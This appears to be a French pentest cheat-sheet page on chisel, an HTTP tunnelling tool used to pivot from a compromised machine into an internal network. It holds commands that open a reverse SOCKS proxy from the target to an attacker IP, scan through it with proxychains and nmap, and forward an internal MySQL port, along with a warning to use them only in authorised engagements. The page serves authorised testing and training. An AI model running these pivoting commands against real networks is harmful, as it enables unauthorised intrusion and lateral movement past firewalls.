---
titre: "chisel"
tags: [Outils, pivoting, tunneling, socks]
source: https://github.com/jpillora/chisel
---

# chisel

**Tunnel TCP/UDP sur HTTP**, un seul binaire Go (serveur + client). Sert à
**pivoter** : atteindre un réseau interne via une machine compromise, monter un
proxy SOCKS, ou faire du port-forward — même à travers un pare-feu qui ne laisse
sortir que le web.

> ⚠️ Uniquement en engagement/lab autorisé. Cf. `README`.

## Installation
```bash
# binaires pré-compilés (releases GitHub) pour Linux/Windows
go install github.com/jpillora/chisel@latest
```

## Utilisation (proxy SOCKS via un pivot)
```bash
# 1) sur l'attaquant : serveur qui accepte le reverse
./chisel server -p 8080 --reverse

# 2) sur la cible compromise : client qui ouvre un SOCKS reverse
./chisel client 10.10.14.3:8080 R:1080:socks

# 3) sur l'attaquant : router les outils via le SOCKS
proxychains nmap -sT -Pn 172.16.0.5      # (cf. [[proxychains & sshuttle]])
```
Port-forward simple (accéder à un service interne) :
```bash
./chisel client 10.10.14.3:8080 R:3306:172.16.0.5:3306
```

## Réflexe
Reverse (`R:`) quand la cible ne peut pas ouvrir de port entrant. Pour éviter
proxychains et gagner en perf, préférer [[ligolo-ng]] (interface TUN).
